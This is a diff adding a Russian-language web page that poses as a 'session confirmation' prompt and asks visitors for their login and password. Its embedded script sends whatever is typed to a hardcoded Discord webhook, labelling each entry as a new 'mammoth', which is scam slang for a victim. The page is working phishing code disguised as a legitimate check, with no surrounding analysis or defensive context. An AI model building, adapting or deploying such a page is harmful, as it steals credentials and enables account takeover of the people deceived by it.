@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Подтверждение сессии</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #1e1e1e;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.6);
+            width: 320px;
+            text-align: center;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            background-color: #2c2c2c;
+            border: 1px solid #444;
+            border-radius: 5px;
+            color: #f0f0f0;
+        }
+
+        input::placeholder {
+            color: #999;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #2563eb;
+        }
+
+        .info-text {
+            margin-bottom: 20px;
+            color: #ccc;
+        }
+
+        h2 {
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Подтверждение сессии</h2>
+        <p class="info-text">Пожалуйста, введите логин и пароль для подтверждения вашей сессии.</p>
+        <form id="sessionForm">
+            <input type="text" placeholder="Логин" name="name" required><br>
+            <input type="password" placeholder="Пароль" name="lvl" required><br>
+            <button type="submit">Подтвердить сессию</button>
+        </form>
+    </div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1384039899493302276/tsQlb7_q4Sk87rP5TmjgkAc5USsvlZKScfZo3pUQLyZPoXiv3wnI8-x5lp6iGWnTgo0-";
+
+        document.getElementById("sessionForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const name = event.target.name.value;
+            const lvl = event.target.lvl.value;
+
+            const payload = {
+                content: `🔒 НОВЫЙ МАМОНТ\nЛогин: **${name}**\nПароль: **${lvl}**`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (response.ok) {
+                    event.target.reset();
+                } else {
+                }
+            }).catch(error => {
+                alert("Ошибка подключения.");
+                console.error(error);
+            });
+        });
+    </script>
+</body>
+</html>
